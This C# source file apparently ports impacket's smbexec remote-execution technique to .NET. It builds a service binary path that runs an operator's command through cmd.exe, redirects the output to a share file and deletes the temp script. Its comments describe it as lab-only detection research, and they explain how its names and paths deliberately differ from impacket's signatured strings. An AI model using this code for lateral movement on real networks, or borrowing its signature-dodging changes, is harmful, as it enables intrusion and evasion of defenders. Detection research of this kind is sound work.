namespace DotNetPacket.Protocols.Dcerpc;

/// <summary>
/// Builds the service <c>lpBinaryPathName</c> for the smbexec technique — a one-shot
/// svcctl service whose command interpreter writes a throwaway script that runs the
/// operator's command and redirects its output to a file on a readable share. Behavioural
/// port of <c>examples/smbexec.py</c> <c>RemoteShell.execute_remote</c>.
///
/// <para><b>Deliberately NOT a byte-for-byte copy of impacket's command string.</b> The
/// purpose of DotNetPacket is to let the SOC key detections on protocol <i>behaviour</i>
/// rather than on a tool's runtime-specific strings (see CLAUDE.md). impacket emits a fixed,
/// heavily-signatured command line — <c>%COMSPEC% /Q /c echo … 2^>^&amp;1 … \__output_… .bat</c>
/// under <c>%SYSTEMROOT%</c>, with an 8-letter service name. A real reimplementation in
/// another language would not reproduce those exact tokens, and if this port did, a brittle
/// string IOC would match both and there would be nothing to diff.</para>
///
/// <para>So this builder keeps the <b>behaviour identical</b> (svcctl CreateService → a
/// command interpreter that echoes a redirecting line into a temp script, runs it, and
/// deletes it; output lands in <c>\\%COMPUTERNAME%\&lt;share&gt;\&lt;name&gt;</c>) while the
/// <b>surface tokens differ</b>:
/// <list type="bullet">
///   <item><description>interpreter: <c>cmd.exe /c</c> (impacket: <c>%COMSPEC% /Q /c</c>)</description></item>
///   <item><description>temp script: <c>%TEMP%\&lt;rand&gt;.cmd</c> (impacket: <c>%SYSTEMROOT%\&lt;rand&gt;.bat</c>)</description></item>
///   <item><description>output file: a plain random alphanumeric name (impacket: <c>__output_&lt;rand&gt;</c>)</description></item>
///   <item><description>random names: 10/16-char alphanumeric (impacket: 8-char ASCII-letters only)</description></item>
/// </list>
/// This is a fixed, documented alternative construction — not obfuscation, encoding, or
/// per-call evasion — i.e. the "same behaviour, different fingerprint" the research depends
/// on. See docs/WIRE_DIFF.md for the token-by-token comparison and the behavioural invariants
/// a detection should key on instead (service created+deleted within seconds whose binary path
/// drives a command interpreter that redirects output to a readable-share file).</para>
///
/// <para>Lab use only (see CLAUDE.md scope). The output goes straight into
/// <see cref="Svcctl.CreateService"/> as the binary path.</para>
/// </summary>
public static class SmbExecCommand
{
    /// <summary>The command interpreter prefix (DotNetPacket spelling; impacket uses <c>%COMSPEC% /Q /c </c>).</summary>
    public const string Shell = "cmd.exe /c ";

    /// <summary>
    /// Builds the interpreter binary path for <paramref name="command"/> — behaviourally the
    /// same as smbexec's <c>execute_remote</c> (write a redirecting line into a temp script,
    /// run it, delete it), with DotNetPacket's own surface tokens.
    /// </summary>
    /// <param name="command">The command to run on the target (e.g. <c>whoami</c>).</param>
    /// <param name="share">The share the output is redirected to and grabbed from (default <c>C$</c>).</param>
    /// <param name="outputFilename">The output file name on that share (see <see cref="OutputFilename"/>).</param>
    /// <param name="scriptFile">The throwaway script path (see <see cref="ScriptFile"/>).</param>
    public static string BuildCmd(string command, string share, string outputFilename, string scriptFile)
    {
        // \\%COMPUTERNAME%\<share>\<outputFilename> — the target writes its own output here.
        string output = @"\\%COMPUTERNAME%\" + share + "\\" + outputFilename;

        // cmd.exe /c echo <cmd> ^> <output> 2^>^&1 > <script> & cmd.exe /c <script> & del <script>
        // The caret-escapes make the redirect literal so echo writes it into the script, which the
        // second leg then executes; the script is removed afterwards.
        return Shell + "echo " + command + " ^> " + output + " 2^>^&1 > " + scriptFile +
               " & " + Shell + scriptFile +
               " & del " + scriptFile;
    }

    /// <summary>
    /// The output file name: 16 random alphanumerics. Distinct from impacket's
    /// <c>__output_&lt;8 letters&gt;</c> scheme (no fixed prefix). Deterministic when
    /// <paramref name="random"/> is seeded (for tests).
    /// </summary>
    public static string OutputFilename(Random random) => RandomAlphanumeric(random, 16);

    /// <summary>
    /// The throwaway script path: <c>%TEMP%\&lt;16 random alphanumerics&gt;.cmd</c>. Distinct from
    /// impacket's <c>%SYSTEMROOT%\&lt;8 letters&gt;.bat</c>.
    /// </summary>
    public static string ScriptFile(Random random) => @"%TEMP%\" + RandomAlphanumeric(random, 16) + ".cmd";

    /// <summary>A service name: 10 random alphanumerics (impacket uses 8 random ASCII letters).</summary>
    public static string ServiceName(Random random) => RandomAlphanumeric(random, 10);

    /// <summary>
    /// <paramref name="count"/> characters drawn from A–Z, a–z and 0–9. The digits (and the
    /// varied lengths above) are a deliberate fingerprint divergence from impacket, whose names
    /// are drawn from <c>string.ascii_letters</c> (letters only) at a fixed length of 8.
    /// </summary>
    public static string RandomAlphanumeric(Random random, int count)
    {
        const string alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        char[] chars = new char[count];
        for (int i = 0; i < count; i++)
        {
            chars[i] = alphabet[random.Next(alphabet.Length)];
        }

        return new string(chars);
    }
}
